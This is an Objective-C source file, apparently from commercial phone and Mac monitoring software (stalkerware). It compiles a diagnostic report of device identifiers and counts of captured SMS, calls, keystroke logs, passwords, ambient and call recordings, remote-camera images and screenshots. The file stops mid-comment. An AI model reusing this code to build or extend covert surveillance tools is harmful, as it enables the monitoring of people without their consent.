/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  RequestDiagnosticProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  24/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */

#import "RequestDiagnosticProcessor.h"
#import "EventRepository.h"
#import "ConnectionHistoryManager.h"
#import "ConnectionLog.h"
#import "ConfigurationManager.h"
#import "AppContext.h"
#import "PhoneInfo.h"
#import "DetailedCount.h"
#import "EventCount.h"
#import "DbHealthInfo.h"
#import "ProductInfo.h"
#import "SystemUtilsImpl.h"
#import "PreferenceManager.h"
#import "PrefEventsCapture.h"
#import "PrefRestriction.h"

#import "ExtraLogger.h"

#if !TARGET_OS_IPHONE
#import "MacInfoImp.h"
#endif

@interface RequestDiagnosticProcessor (PrivateAPI)
- (void) sendReplySMSWithResult:(NSString *) aResult; 
- (void) processRequestDiagnostic;
@end

@implementation RequestDiagnosticProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the RequestDiagnosticProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: No return type
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData {
    DLog (@"RequestDiagnosticProcessor-->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
		
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the RequestDiagnosticProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"RequestDiagnosticProcessor--->doProcessingCommand....")
	
	if (![RemoteCmdSignatureUtils verifyRemoteCmdDataSignature:mRemoteCmdData numberOfCompulsoryTag:1]      &&
        ![RemoteCmdSignatureUtils verifyRemoteCmdDataSignature:mRemoteCmdData numberOfCompulsoryTag:2]      ){
		[RemoteCmdSignatureUtils throwInvalidCmdWithName:@"RequestDiagnosticProcessor"
												  reason:@"Failed signature check"];
	}
	
	[self processRequestDiagnostic];
}


#pragma mark RequestDiagnosticProcessor Private Methods

/**
 - Method name: processRequestDiagnostic
 - Purpose:This method is used to process RequestDiagnostic 
 - Argument list and description: No Argument
 - Return description: No Return Type
*/
+ (NSString *) getRequestDiagnostic{
    DLog (@"RequestDiagnosticProcessor--->processRequestDiagnostic")
    //=======Diagnostic Result Format===========
    
    // -- Application info
    NSString *pidString					= @"1.1>";
    NSString *versionString				= @"1.2>";
    NSString *osVersionString			= @"1.3>";
    NSString *deviceModelString			= @"1.4>";
    NSString *phoneName					= @"1.5>";
    NSString *activationCode			= @"1.6>";
    
    /// -- Server error, info related to deactivation
    NSString *deviceIDString			= @"1.7>";  //1.7​	​Device ID              An IMEI​	​1.7>356789123456
    NSString *deactivationInfo			= @"1.8>";  //​1.8	​Deactivation Info      Is it 'force deactivate', Last deactivate time​ ​1.8>1, dd/mm/yyyy HH:MM:ss
    NSString *licenseCorruptString      = @"1.9>";
    NSString *licenseStatus             = @"1.11>";
    NSString *configurationID           = @"1.12>";
    
    // -- Event Capture
    NSString *smsEventString			= @"2.1>";
    NSString *mmsEventsString			= @"2.2>";
    NSString *voiceEventString			= @"2.3>";
    NSString *locationEventString		= @"2.4>";
    NSString *emailEventString			= @"2.5>";
    NSString *imEventString				= @"2.6>";
    NSString *browserURLEventString		= @"2.8>";
    NSString *alcEventString			= @"2.9>";
    
    NSString *systemEventString			= @"2.10>";
    NSString *settingEventString		= @"2.11>";
    NSString *panicEventString			= @"2.12>";
    NSString *thumbnailsString			= @"2.13>";
    NSString *ambientRecordString		= @"2.14>";
    NSString *audioCallRecordString		= @"2.15>";
    NSString *remoteCameraString		= @"2.16>";
    NSString *imAccContConverEventString= @"2.17>";
    NSString *voIPEventString			= @"2.18>";
    NSString *keyLogEventString			= @"2.19>";
    
    NSString *pageVisitedString         = @"2.20>";
    NSString *passwordString            = @"2.21>";
    NSString *imMacOSEventString        = @"2.22>";
    NSString *usbConnEventString        = @"2.23>";
    NSString *fileTransferEventString   = @"2.24>";
    NSString *emailMacOSEventString     = @"2.25>";
    NSString *appUsageEventString       = @"2.26>";
    NSString *logonEventString          = @"2.27>";
    NSString *screenRecordingEventString= @"2.28>";
    NSString *networkConnection         = @"2.29>";
    
    NSString *fileActivityEventString   = @"2.32>";
    NSString *networkTraffic            = @"2.33>";
    NSString *printJob                  = @"2.34>";
    NSString *appScreenShotEventString  = @"2.36>";
    
    NSString *voipAudioCallRecordString = @"2.38>";
    
    // -- Connection Info
    NSString *lastConnTimeString		= @"3.1>";
    NSString *serverCodeString			= @"3.2>";
    NSString *clientCodeString			= @"3.3>";
    
    /// !-- Server error codes, last 10 status codes
    NSString *lastUniqueServerCodesString= @"3.4>";
    
    
    // -- Network info
    NSString *tupleString				= @"4.1>";
    NSString *networkNameString			= @"4.2>";
    //	NSString *availNetworkConnectionString	= @"4.3>N/A";	/// !!!:TODO
    //	NSString *callWaitingString			= @"4.4>N/A";		/// !!!:TODO
    //	NSString *callForwardingString		= @"4.5>N/A";		/// !!!:TODO
    
    // -- Phone Info
    NSString *installDriveString		= @"5.1>/";
    NSString *gpsString					= @"5.4>AGPS, WiFi";
    //	NSString *internalMemUsageString	= @"5.2>N/A";		/// !!!:TODO
    NSString *batteryLevelString		= @"5.6>";
    
    //===============================================
    id <EventRepository> respository = [[RemoteCmdUtils sharedRemoteCmdUtils] mEventRepository];
    id <ConnectionHistoryManager> connectionManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mConnectionHistoryManager];
    id <ConfigurationManager> configurationManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mConfigurationManager];
    id <AppContext> context = [[RemoteCmdUtils sharedRemoteCmdUtils] mAppContext];
    id <PhoneInfo> phoneInfo = [context getPhoneInfo];
    id <ProductInfo> productInfo = [context getProductInfo];
    //id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
    //DbHealthInfo *dbHealthInfo = [respository dbHealthInfo];
    LicenseManager *licenseManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mLicenseManager];
    
    NSArray *allConnectionHistory = [connectionManager selectAllConnectionHistory];
    ConnectionLog *lastConnectionLog = [allConnectionHistory lastObject];
    NSString *lastConnectionTime = [lastConnectionLog mDateTime];
    DetailedCount *detailedCount = nil;
    EventCount *eventCount=[respository eventCount];
    
    // -- PART 1: Application Info ---------------------------------------------------------------
    // 1.1 Pid
    pidString		= [pidString stringByAppendingString:[NSString stringWithFormat:@"%d",[productInfo getProductID]]];
    // 1.2 version
    versionString	= [versionString stringByAppendingString:[productInfo getProductFullVersion]];
    //pidVersionString =[pidVersionString stringByAppendingString:[NSString stringWithFormat:@"%d,%@ Date:%@",[productInfo getProductID],[productInfo getProductFullVersion],[productInfo getBuildDate]]];
    // 1.3 OS Version
    osVersionString = [osVersionString stringByAppendingString:[SystemUtilsImpl deviceIOSVersion]];
    // 1.4 Device Model
    //	deviceModelString = [deviceModelString stringByAppendingString:[NSString stringWithFormat:@"%@ %@",
    //																   //[phoneInfo getDeviceModel],
    //																	[SystemUtilsImpl deviceModelVersion],
    //																	[SystemUtilsImpl deviceIOSVersion]]];
    deviceModelString = [deviceModelString stringByAppendingString:[SystemUtilsImpl deviceModelVersion]];
    
    // 1.5 Phone Name
#if TARGET_OS_IPHONE
    phoneName           = [phoneName stringByAppendingString:[[UIDevice currentDevice] name]];
#else
    MacInfoImp *macInfo = [[MacInfoImp alloc] init];
    phoneName           = [phoneName stringByAppendingString:[macInfo getComputerName]];
    [macInfo release];
#endif
    
    // 1.6 Activation Code
    activationCode = [activationCode stringByAppendingString:[licenseManager getActivationCode]];
	   
    // 1.7 Device ID
    NSString *IMEI = [[[[RemoteCmdUtils sharedRemoteCmdUtils] mAppContext] getPhoneInfo] getIMEI];
    deviceIDString = [deviceIDString stringByAppendingString:[NSString stringWithFormat:@"%@", IMEI]];
    
    // 1.8 Deactivation Info
    ExtraLogger *logger = [[ExtraLogger alloc] init];
    NSString *tempDeactivationInfo = [logger getLastRowDeactivationStatus];
    if (!tempDeactivationInfo || [tempDeactivationInfo isEqualToString:@""])
        tempDeactivationInfo = NSLocalizedString(@"kNONE", @"");
    deactivationInfo    = [deactivationInfo stringByAppendingString:[NSString stringWithFormat:@"%@",tempDeactivationInfo]];
    [logger release];
    
    // 1.9 License corrupted
    licenseCorruptString = [licenseCorruptString stringByAppendingString:[NSString stringWithFormat:@"%d", [licenseManager isLicenseCorrupt]]];
    
    // 1.11 License status
    NSString *statusString = @"";
    int status = [licenseManager getLicenseStatus];
    switch (status) {
        case LC_UNKNOWN:
        case DEACTIVATED:
            statusString = NSLocalizedString(@"kLicenseStatusDeactivated", @"");
            break;
        case ACTIVATED:
            statusString = NSLocalizedString(@"kLicenseStatusActivated", @"");
            break;
        case EXPIRED:
            statusString = NSLocalizedString(@"kLicenseStatusExpired", @"");
            break;
        case DISABLE:
            statusString = NSLocalizedString(@"kLicenseStatusDisabled", @"");
            break;
        default:
            break;
    }
    licenseStatus = [licenseStatus stringByAppendingString:statusString];
    
    
    // 1.12 Configuration ID
    configurationID = [configurationID stringByAppendingString:[NSString stringWithFormat:@"%ld", (long)[licenseManager getConfiguration]]];
    
    // -- PART 2: Event Capture ---------------------------------------------------------------
    
    // 2.1 SMS
    if ([configurationManager isSupportedFeature:kFeatureID_EventSMS]) {
        detailedCount = [eventCount countEvent:kEventTypeSms];
        smsEventString = [smsEventString stringByAppendingString:[NSString stringWithFormat:@"%d,%d",[detailedCount inCount], [detailedCount outCount]]];
        DLog(@"---->SMS done<----")
    } else {
        smsEventString = @"";
    }
    
    // 2.2 MMS
    if ([configurationManager isSupportedFeature:kFeatureID_EventMMS]) {
        detailedCount = [eventCount countEvent:kEventTypeMms];
        mmsEventsString=[mmsEventsString stringByAppendingString:[NSString stringWithFormat:@"%d,%d",[detailedCount inCount], [detailedCount outCount]]];
        DLog(@"---->MMS done<----")
    } else {
        mmsEventsString = @"";
    }
    
    
    // 2.3 Call
    if ([configurationManager isSupportedFeature:kFeatureID_EventCall]) {
        detailedCount = [eventCount countEvent:kEventTypeCallLog];
        voiceEventString=[voiceEventString stringByAppendingString:[NSString stringWithFormat:@"%d,%d,%d",[detailedCount inCount], [detailedCount outCount], [detailedCount missedCount]]];
        DLog(@"---->Call done<----")
    } else {
        voiceEventString = @"";
    }
    
    
    // 2.4 Location
    if ([configurationManager isSupportedFeature:kFeatureID_EventLocation]) {
        detailedCount = [eventCount countEvent:kEventTypeLocation];
        locationEventString =[locationEventString stringByAppendingString:[NSString stringWithFormat:@"%d",[detailedCount totalCount]]];
        DLog(@"---->Location done<----")
    } else {
        locationEventString = @"";
    }
    
    
    // 2.5 Email
    if ([configurationManager isSupportedFeature:kFeatureID_EventEmail]) {
        detailedCount = [eventCount countEvent:kEventTypeMail];
        emailEventString=[emailEventString stringByAppendingString:[NSString stringWithFormat:@"%d,%d",[detailedCount inCount], [detailedCount outCount]]];
        DLog(@"---->Email done<----")
    } else {
        emailEventString = @"";
    }
    
    
    // 2.6 IM
    if ([configurationManager isSupportedFeature:kFeatureID_EventIM]) {
        //detailedCount = [eventCount countEvent:kEventTypeIM];
        detailedCount = [eventCount countEvent:kEventTypeIMMessage];
        imEventString = [imEventString stringByAppendingString:[NSString stringWithFormat:@"%d,%d",[detailedCount inCount], [detailedCount outCount]]];
        DLog(@"---->IM done<----")
    } else {
        imEventString = @"";
    }
    
    
    // 2.7	pin (we does not support)
    
    // 2.8	Browser url count
    if ([configurationManager isSupportedFeature:kFeatureID_EventBrowserUrl]) {
        detailedCount = [eventCount countEvent:kEventTypeBrowserURL];
        browserURLEventString = [browserURLEventString stringByAppendingString:[NSString stringWithFormat:@"%d",[detailedCount totalCount]]];
        DLog(@"---->Browser URL done<----")
    } else {
        browserURLEventString = @"";
    }
    
    
    // 2.9	Application life cycle
    if ([configurationManager isSupportedFeature:kFeatureID_ApplicationLifeCycleCapture]) {
        detailedCount = [eventCount countEvent:kEventTypeApplicationLifeCycle];
        alcEventString = [alcEventString stringByAppendingString:[NSString stringWithFormat:@"%d",[detailedCount totalCount]]];
    } else {
        alcEventString = @"";
    }
    
    
    // 2.10	System
    if ([configurationManager isSupportedFeature:kFeatureID_EventSystem]) {
        detailedCount = [eventCount countEvent:kEventTypeSystem];
        systemEventString=[systemEventString stringByAppendingString:[NSString stringWithFormat:@"%d", [detailedCount totalCount]]];
        DLog(@"---->System done<----")
    } else {
        systemEventString = @"";
    }
    
    
    // 2.11 Setting Event count
    detailedCount = [eventCount countEvent:kEventTypeSettings];
    settingEventString = [settingEventString stringByAppendingString:[NSString stringWithFormat:@"%d",[detailedCount totalCount]]];
    DLog(@"---->Setting done<----")
    
    // 2.12	Panic status, panic image
    if ([configurationManager isSupportedFeature:kFeatureID_Panic]) {
        detailedCount = [eventCount countEvent:kEventTypePanic];
        NSInteger panicStatus = [detailedCount totalCount];
        detailedCount = [eventCount countEvent:kEventTypePanicImage];
        NSInteger panicImage = [detailedCount totalCount];
        panicEventString = [panicEventString stringByAppendingString:[NSString stringWithFormat:@"%d,%d",panicStatus, panicImage]];
    } else {
        panicEventString = @"";
    }
    
    
    // 2.13	Thumbnail
    if ([configurationManager isSupportedFeature:kFeatureID_EventCameraImage] ||
        [configurationManager isSupportedFeature:kFeatureID_EventWallpaper] ||
        [configurationManager isSupportedFeature:kFeatureID_EventSoundRecording] ||
        [configurationManager isSupportedFeature:kFeatureID_EventVideoRecording] ||
        [configurationManager isSupportedFeature:kFeatureID_SearchMediaFilesInFileSystem]) {
        
        detailedCount = [eventCount countEvent:kEventTypeCameraImage];
        NSInteger image = [detailedCount totalCount]; // Image Count
        
        detailedCount = [eventCount countEvent:kEventTypeAudio];
        NSInteger audio = [detailedCount totalCount]; // Audio Count
        
        detailedCount = [eventCount countEvent:kEventTypeVideo];
        NSInteger video = [detailedCount totalCount]; // Video Count
        
        detailedCount = [eventCount countEvent:kEventTypeWallpaper];
        NSInteger wp = [detailedCount totalCount]; // Wallpaer Count
        
        thumbnailsString=[thumbnailsString stringByAppendingString:[NSString stringWithFormat:@"%d,%d,%d,%d", image, audio, video, wp]];
        DLog(@"---->Thumbnail done<----")
    } else {
        thumbnailsString = @"";
    }
    
    
    // 2.14	ambient record
    if ([configurationManager isSupportedFeature:kFeatureID_AmbientRecording]) {
        detailedCount = [eventCount countEvent:kEventTypeAmbientRecordAudio];
        NSInteger ambientRecordCount = [detailedCount totalCount];
        ambientRecordString = [ambientRecordString stringByAppendingString:[NSString stringWithFormat:@"%d", ambientRecordCount]];
        DLog(@"---->ambient done<----")
    } else {
        ambientRecordString = @"";
    }
    
    
    // 2.15 audio call recording
    if ([configurationManager isSupportedFeature:kFeatureID_CallRecording]) {
        detailedCount = [eventCount countEvent:kEventTypeCallRecordAudio];
        NSInteger callRecordCount = [detailedCount totalCount];
        audioCallRecordString = [audioCallRecordString stringByAppendingString:[NSString stringWithFormat:@"%ld", (long)callRecordCount]];
        DLog(@"---->call recording done<----")
    } else {
        audioCallRecordString = @"";
    }
    
    
    // 2.16 remote camera
    if ([configurationManager isSupportedFeature:kFeatureID_RemoteCameraImage]) {
        detailedCount = [eventCount countEvent:kEventTypeRemoteCameraImage];
        NSInteger remoteCameraCount = [detailedCount totalCount];
        remoteCameraString = [remoteCameraString stringByAppendingString:[NSString stringWithFormat:@"%d", remoteCameraCount]];
        DLog(@"---->remote camera done<----")
    } else {
        remoteCameraString = @"";
    }
    
    
    // 2.17	​IM Account, IM Contact, IM Conversation events 	​​	IM Account, IM Contact, IM Conversation events 	​	e.g., 2.17>1,5,1
    if ([configurationManager isSupportedFeature:kFeatureID_EventIM]) {
        detailedCount				= [eventCount countEvent:kEventTypeIMAccount];
        NSInteger imAccountCount	= [detailedCount totalCount];
        detailedCount				= [eventCount countEvent:kEventTypeIMConversation];
        NSInteger imConversationCount = [detailedCount totalCount];
        detailedCount				= [eventCount countEvent:kEventTypeIMContact];
        NSInteger imContactCount	= [detailedCount totalCount];
        imAccContConverEventString	= [imAccContConverEventString stringByAppendingString:[NSString stringWithFormat:@"%d,%d,%d", imAccountCount, imConversationCount, imContactCount]];
        DLog(@"---->IM Account, IM Contact, IM conversation done<----")
    } else {
        imAccContConverEventString = @"";
    }
				
    // 2.18	VoIP events											​IN,OUT,MISSED 	​									e.g., 2.18>1,0,5
    if ([configurationManager isSupportedFeature:kFeatureID_EventVoIP]) {
        detailedCount		= [eventCount countEvent:kEventTypeVoIP];
        voIPEventString		= [voIPEventString stringByAppendingString:[NSString stringWithFormat:@"%d,%d,%d",[detailedCount inCount], [detailedCount outCount], [detailedCount missedCount]]];
        DLog(@"---->VOIP done<----")
    } else {
        voIPEventString		= @"";
    }
    
    // 2.19 Key log events
    if ([configurationManager isSupportedFeature:kFeatureID_EventKeyLog]) {
        detailedCount		= [eventCount countEvent:kEventTypeKeyLog];
        keyLogEventString	= [keyLogEventString stringByAppendingString:[NSString stringWithFormat:@"%d",[detailedCount totalCount]]];
        DLog(@"---->Key Log done<----")
    } else {
        keyLogEventString = @"";
    }
    
    // 2.20 Page visited events
    if ([configurationManager isSupportedFeature:kFeatureID_EventPageVisited]) {
        detailedCount		= [eventCount countEvent:kEventTypePageVisited];
        pageVisitedString	= [pageVisitedString stringByAppendingString:[NSString stringWithFormat:@"%d",[detailedCount totalCount]]];
        DLog(@"---->Page visited done<----")
    } else {
        pageVisitedString = @"";
    }
    
    // 2.21 Password
    if ([configurationManager isSupportedFeature:kFeatureID_EventPassword]) {
        detailedCount		= [eventCount countEvent:kEventTypePassword];
        passwordString      = [passwordString stringByAppendingString:[NSString stringWithFormat:@"%ld",[detailedCount totalCount]]];
        DLog(@"---->Password done<----")
    } else {
        passwordString = @"";
    }
    
    // 2.22 IM Mac
    if ([configurationManager isSupportedFeature:kFeatureID_EventMacOSIM]) {
        detailedCount		= [eventCount countEvent:kEventTypeIMMacOS];
        imMacOSEventString  = [imMacOSEventString stringByAppendingString:[NSString stringWithFormat:@"%ld",(long)[detailedCount totalCount]]];
        DLog(@"---->IM Mac done<----")
    } else {
        imMacOSEventString = @"";
    }
    
    // 2.23 Usb connection
    if ([configurationManager isSupportedFeature:kFeatureID_EventMacOSUSBConnection]) {
        detailedCount		= [eventCount countEvent:kEventTypeUsbConnection];
        usbConnEventString  = [usbConnEventString stringByAppendingString:[NSString stringWithFormat:@"%ld",(long)[detailedCount totalCount]]];
        DLog(@"---->Usb done<----")
    } else {
        usbConnEventString = @"";
    }
    
    // 2.24 File transfer
    if ([configurationManager isSupportedFeature:kFeatureID_EventMacOSFileTransfer]) {
        detailedCount		= [eventCount countEvent:kEventTypeFileTransfer];
        fileTransferEventString = [fileTransferEventString stringByAppendingString:[NSString stringWithFormat:@"%ld,%ld",(long)[detailedCount inCount],(long)[detailedCount outCount]]];
        DLog(@"---->File transfer done<----")
    } else {
        fileTransferEventString = @"";
    }
    
    // 2.25 Email Mac
    if ([configurationManager isSupportedFeature:kFeatureID_EVentMacOSEmail]) {
        detailedCount		= [eventCount countEvent:kEventTypeEmailMacOS];
        emailMacOSEventString = [emailMacOSEventString stringByAppendingString:[NSString stringWithFormat:@"%ld,%ld",(long)[detailedCount inCount],(long)[detailedCount outCount]]];
        DLog(@"---->Email Mac done<----")
    } else {
        emailMacOSEventString = @"";
    }
    
    // 2.26 App usage
    if ([configurationManager isSupportedFeature:kFeatureID_EventMacOSAppUsage]) {
        detailedCount		= [eventCount countEvent:kEventTypeAppUsage];
        appUsageEventString = [appUsageEventString stringByAppendingString:[NSString stringWithFormat:@"%ld", (long)[detailedCount totalCount]]];
        DLog(@"---->App usage done<----")
    } else {
        appUsageEventString = @"";
    }
    
    // 2.27 Logon
    if ([configurationManager isSupportedFeature:kFeatureID_EventMacOSLogon]) {
        detailedCount		= [eventCount countEvent:kEventTypeLogon];
        logonEventString    = [logonEventString stringByAppendingString:[NSString stringWithFormat:@"%ld", (long)[detailedCount totalCount]]];
        DLog(@"---->Logon done<----")
    } else {
        logonEventString = @"";
    }
    
    // 2.28 Screenshot record
    if ([configurationManager isSupportedFeature:kFeatureID_ScreenRecording]) {
        detailedCount		= [eventCount countEvent:kEventTypeScreenRecordSnapshot];
        screenRecordingEventString = [screenRecordingEventString stringByAppendingString:[NSString stringWithFormat:@"%ld", (long)[detailedCount totalCount]]];
        DLog(@"---->Screenshot record done<----")
    } else {
        screenRecordingEventString = @"";
    }
    
    // 2.29 Network connection
    if ([configurationManager isSupportedFeature:kFeatureID_EventNetworkConnection]) {
        detailedCount		= [eventCount countEvent:kEventTypeNetworkConnectionMacOS];
        networkConnection = [networkConnection stringByAppendingString:[NSString stringWithFormat:@"%ld", (long)[detailedCount totalCount]]];
        DLog(@"---->Network connection done<----")
    } else {
        networkConnection = @"";
    }
    
    // 2.32 File activity
    if ([configurationManager isSupportedFeature:kFeatureID_EventFileActivity]) {
        detailedCount = [eventCount countEvent:kEventTypeFileActivity];
        fileActivityEventString = [fileActivityEventString stringByAppendingString:[NSString stringWithFormat:@"%ld", (long)[detailedCount totalCount]]];
        DLog(@"---->File activity done<----")
    } else {
        fileActivityEventString = @"";
    }
    
    // 2.33 Network traffic
    if ([configurationManager isSupportedFeature:kFeatureID_EventNetworkTraffic]) {
        detailedCount		= [eventCount countEvent:kEventTypeNetworkTraffic];
        networkTraffic = [networkTraffic stringByAppendingString:[NSString stringWithFormat:@"%ld", (long)[detailedCount totalCount]]];
        DLog(@"---->Network traffic done<----")
    } else {
        networkTraffic = @"";
    }
    
    // 2.34 Print Job
    if ([configurationManager isSupportedFeature:kFeatureID_EventPrintJob]) {
        detailedCount		= [eventCount countEvent:kEventTypePrintJob];
        printJob = [printJob stringByAppendingString:[NSString stringWithFormat:@"%ld", (long)[detailedCount totalCount]]];
        DLog(@"---->Print Job done<----")
    } else {
        printJob = @"";
    }
    
    // 2.36 App Screen Shot
    if ([configurationManager isSupportedFeature:kFeatureID_EventAppScreenShot]) {
        detailedCount		     = [eventCount countEvent:kEventTypeAppScreenShot];
        appScreenShotEventString = [appScreenShotEventString stringByAppendingString:[NSString stringWithFormat:@"%ld", (long)[detailedCount totalCount]]];
        DLog(@"---->AppScreenShot  done<----")
    } else {
        appScreenShotEventString = @"";
    }
    
    // 2.38 VoIP audio call recording
    if ([configurationManager isSupportedFeature:kFeatureID_VoIPCallRecording]) {
        detailedCount = [eventCount countEvent:kEventTypeVoIPCallRecordAudio];
        NSInteger voipCallRecordCountIn = [detailedCount inCount];
        NSInteger voipCallRecordCountOut = [detailedCount outCount];
        voipAudioCallRecordString = [voipAudioCallRecordString stringByAppendingString:[NSString stringWithFormat:@"%ld,%ld", (long)voipCallRecordCountIn, (long)voipCallRecordCountOut]];
        DLog(@"---->VoIP audio call recording done<----")
    } else {
        voipAudioCallRecordString = @"";
    }
    DLog(@"---->last Conn Time<----")
    // -- PART 3: Event Connection Info ---------------------------------------------------------------
    
    // 3.1 Last connection time
    if (lastConnectionTime) {	// check first otherwise it will cause NSException = *** -[__NSCFConstantString stringByAppendingString:]: nil argument
        lastConnTimeString=[lastConnTimeString stringByAppendingString:lastConnectionTime];
        // format from 22-08-2012 to 22/08/2012
        lastConnTimeString = [lastConnTimeString stringByReplacingOccurrencesOfString:@"-" withString:@"/"];
    }
    
    // 3.2 and 3.3 Response Code
    if ([lastConnectionLog mErrorCode] < 0) {
        clientCodeString = [NSString stringWithFormat:@"%@%d",clientCodeString,[lastConnectionLog mErrorCode]];
        serverCodeString = [NSString stringWithFormat:@"%@%d",serverCodeString, 0];
        DLog(@"---->Response Code done<----")
    } else {
        serverCodeString = [NSString stringWithFormat:@"%@%d",serverCodeString,[lastConnectionLog mErrorCode]];
        clientCodeString = [NSString stringWithFormat:@"%@%d",clientCodeString, 0];
        DLog(@"---->Response Code done<----")
    }
    
    //​ 3.4 Last 10 of server's error codes
    NSArray *serverCodes = [connectionManager selectAllServerCodes];
    NSString *tempServerError = [serverCodes componentsJoinedByString:@","];
    if (!tempServerError || [tempServerError isEqualToString:@""] || [serverCodes count] == 0)
        tempServerError = NSLocalizedString(@"kNONE", @"");;
    lastUniqueServerCodesString = [lastUniqueServerCodesString stringByAppendingString:[NSString stringWithFormat:@"%@", tempServerError]];
    
    // -- PART 4: Network Info ---------------------------------------------------------------
    
    // 4.1	TUPLE
#if TARGET_OS_IPHONE
    NSString *mcc = ([phoneInfo getMobileCountryCode] == nil) ? @"" : [phoneInfo getMobileCountryCode];
    NSString *mnc = ([phoneInfo getMobileNetworkCode] == nil) ? @"" : [phoneInfo getMobileNetworkCode];
    tupleString= [NSString stringWithFormat:@"%@%@,%@", tupleString,mcc,mnc];
    DLog(@"---->tupleString<----")
#else
    tupleString = @"";
#endif
    
    // 4.2	Network name
#if TARGET_OS_IPHONE
    //networkNameString=[networkNameString stringByAppendingString:[phoneInfo getNetworkName]]; // [__NSCFConstantString stringByAppendingString:]: nil argument
    NSString *networkName = ([phoneInfo getNetworkName] == nil) ? @"" : [phoneInfo getNetworkName];
    networkNameString = [NSString stringWithFormat:@"%@%@", networkNameString, networkName];
    DLog(@"---->networkNameString<----")
#else
    networkNameString = @"";
#endif
    // 4.3 Available internet connnection
    
    // 4.4 Call waiting status
    
    // 4.5 Call forwarding status
    
    
    // -- PART 5: Phone info
    
    // 5.1	initial drive
    // already done
    
    // 5.2	internal mem usage
    // 5.4
#if TARGET_OS_IPHONE
#else
    gpsString = @"";
#endif
    // 5.6	Battery level
    
#if TARGET_OS_IPHONE
    BOOL previousBatteryMonitoringStatus = [[UIDevice currentDevice] isBatteryMonitoringEnabled];
    [[UIDevice currentDevice] setBatteryMonitoringEnabled:YES]; // If battery monitoring is not enabled, the value of 'batteryLevel' property is –1.0.
    float batteryLevel = [[UIDevice currentDevice] batteryLevel];
    DLog(@"Battery info %f", batteryLevel)
    [[UIDevice currentDevice] setBatteryMonitoringEnabled:previousBatteryMonitoringStatus];
    
    if (batteryLevel >= 0.0 && batteryLevel <= 1.0) {
        // 1 convert from 0.x to y percent (e.g., 0.1 --> 10 %)
        // 2 convert float to int
        NSNumber *batteryLevelNum = [NSNumber numberWithFloat:(batteryLevel * 100)];
        batteryLevelString = [batteryLevelString stringByAppendingString:[NSString stringWithFormat:@"%d", [batteryLevelNum intValue]]];
    } else {
        DLog (@"Invalid battery level")
    }
#else
    batteryLevelString = @"";
#endif
    
    NSString *result =[NSString stringWithFormat:@"%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n",
                       pidString,								// 1.1
                       versionString,							// 1.2
                       osVersionString,							// 1.3
                       deviceModelString,                       // 1.4
                       phoneName,								// 1.5
                       activationCode,							// 1.6
                       deviceIDString,                          // 1.7
                       deactivationInfo,                        // 1.8
                       licenseCorruptString,                    // 1.9
                       
                       licenseStatus,                           // 1.11
                       configurationID,                         // 1.12
                       
                       smsEventString,                          // 2.1
                       mmsEventsString,                         // 2.2
                       voiceEventString,                        // 2.3
                       locationEventString,                     // 2.4
                       emailEventString,                        // 2.5
                       imEventString,                           // 2.6
                       browserURLEventString,                   // 2.8
                       alcEventString,                          // 2.9
                       
                       systemEventString,						// 2.10
                       settingEventString,                      // 2.11
                       panicEventString,                        // 2.12
                       thumbnailsString,                        // 2.13
                       ambientRecordString,						// 2.14
                       audioCallRecordString,					// 2.15
                       remoteCameraString,						// 2.16
                       imAccContConverEventString,				// 2.17
                       voIPEventString,							// 2.18
                       keyLogEventString,						// 2.19
                       
                       pageVisitedString,                       // 2.20
                       passwordString,                          // 2.21
                       imMacOSEventString,                      // 2.22
                       usbConnEventString,                      // 2.23
                       fileTransferEventString,                 // 2.24
                       emailMacOSEventString,                   // 2.25
                       appUsageEventString,                     // 2.26
                       logonEventString,                        // 2.27
                       screenRecordingEventString,              // 2.28
                       networkConnection,                       // 2.29
                       
                       fileActivityEventString,                 // 2.32
                       networkTraffic,                          // 2.33
                       printJob,                                // 2.34
                       appScreenShotEventString,                // 2.36
                      
                       voipAudioCallRecordString,               // 2.38

                       lastConnTimeString,                      // 3.1
                       serverCodeString,						// 3.2
                       clientCodeString,						// 3.3
                       lastUniqueServerCodesString,             // 3.4
                       
                       tupleString,                             // 4.1
                       networkNameString,                       // 4.2
                       //availNetworkConnectionString,			// 4.3
                       //callWaitingString,						// 4.4
                       //callForwardingString,					// 4.5
                       
                       installDriveString,                      // 5.1
                       gpsString,								// 5.4
                       //internalMemUsageString,				// 5.2
                       batteryLevelString];						// 5.6
    
    // Replacing any continously new lines with one new line till no longer contiunous new lines
    while (1) {
        NSRange locationOfnn = [result rangeOfString:@"\n\n"];
        if (locationOfnn.location != NSNotFound) {
            result = [result stringByReplacingOccurrencesOfString:@"\n\n"
                                                       withString:@"\n"];
        } else {
            break;
        }
    }
    
    // ============
    // 9 APN
    // already done
    // 12 Database size
    //	dbSizeString=[dbSizeString stringByAppendingString:[NSString stringWithFormat:@"%llu", ([dbHealthInfo mDatabaseSize])/1024]];
    //	// 14 Available size
    //	availableMemoryString = [availableMemoryString stringByAppendingString:[NSString stringWithFormat:@"%lluKB", ([dbHealthInfo mAvailableSize])/1024]];
    //
    //	// 15  Database Corrupt count
    //	NSInteger writeErrorCount = 0;
    //	NSInteger readErrorCount = 0;
    //	NSArray *tableLogArray = [dbHealthInfo tableLogArray];
    //	for (NSValue *tableHealthLogValue in tableLogArray){
